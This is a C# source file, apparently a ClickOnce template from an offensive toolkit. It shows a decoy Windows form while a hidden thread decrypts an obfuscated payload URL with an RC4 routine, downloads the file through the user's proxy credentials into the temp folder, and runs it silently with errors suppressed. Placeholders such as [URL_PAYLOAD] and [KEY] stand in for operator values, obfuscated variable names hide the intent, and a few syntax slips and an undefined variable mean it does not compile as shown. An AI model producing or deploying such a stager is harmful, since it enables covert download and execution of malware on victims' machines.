using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.IO;
using System.Text;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;
using System.Net;

namespace ClickOnceTemplate
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Thread VAR7 = new Thread(() => VAR8());
            VAR7.Start();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }

        static IntPtr VAR8()
        {
            byte[] VAR9 = {[KEY]};
				    byte[] VAR10 = Convert.FromBase64String(VAR60.VAR61("[URL_PAYLOAD]"));
            byte[] VAR11 = Convert.FromBase64String(VAR60.VAR61("[FILENAME]"));
            string VAR103 = Encoding.ASCII.GetString(VAR16.VAR28(VAR9, VAR10);
            string VAR104 = Encoding.ASCII.GetString(VAR16.VAR28(VAR9, VAR11));
            
            WebClient VAR20 = new WebClient();
            IWebProxy VAR21 = WebRequest.DefaultWebProxy;
            if (VAR21 != null)
            {
                VAR21.Credentials = CredentialCache.DefaultCredentials;
                VAR20.Proxy = VAR21;
            }
            try
            {
                string VAR22 = Path.GetTempPath() + VAR10;
                client.DownloadFile(VAR103, VAR22);
                Thread.Sleep(5000);
                Process VAR23 = new Process();

                VAR23.StartInfo.UseShellExecute = false;
                VAR23.StartInfo.FileName = VAR22;
                VAR23.StartInfo.CreateNoWindow = true;
                VAR23.Start();
            } catch(Exception e) {

            }
	      }
    }
	
	public class VAR60 {
		public static string VAR61(string VAR62) {
			string VAR63 = "[PATTERN_1]";
			string VAR64 = "[PATTERN_2]";
			return VAR62.Replace(VAR63, "N").Replace(VAR64, "B");
		}
	}

	public class VAR16 {
		public static byte[] VAR17(byte[] VAR18, byte[] VAR19) {
			int VAR20, VAR21, VAR22, VAR23, VAR24;
			int[] VAR25, VAR26;
			byte[] VAR27;
			VAR25 = new int[256];
			VAR26 = new int[256];
			VAR27 = new byte[VAR19.Length];
			for (VAR21 = 0; VAR21 < 256; VAR21++) {
				VAR25[VAR21] = VAR18[VAR21 % VAR18.Length];
				VAR26[VAR21] = VAR21;
			}
			for (VAR22 = VAR21 = 0; VAR21 < 256; VAR21++) {
				VAR22 = (VAR22 + VAR26[VAR21] + VAR25[VAR21]) % 256;
				VAR24 = VAR26[VAR21];
				VAR26[VAR21] = VAR26[VAR22];
				VAR26[VAR22] = VAR24;
			}
			for (VAR20 = VAR22 = VAR21 = 0; VAR21 < VAR19.Length; VAR21++) {
				VAR20++;
				VAR20 %= 256;
				VAR22 += VAR26[VAR20];
				VAR22 %= 256;
				VAR24 = VAR26[VAR20];
				VAR26[VAR20] = VAR26[VAR22];
				VAR26[VAR22] = VAR24;
				VAR23 = VAR26[((VAR26[VAR20] + VAR26[VAR22]) % 256)];
				VAR27[VAR21] = (byte)(VAR19[VAR21] ^ VAR23);
			}
			return VAR27;
		}
		public static byte[] VAR28(byte[] VAR29, byte[] VAR30) {
			return VAR17(VAR29, VAR30);
		}
	}
}
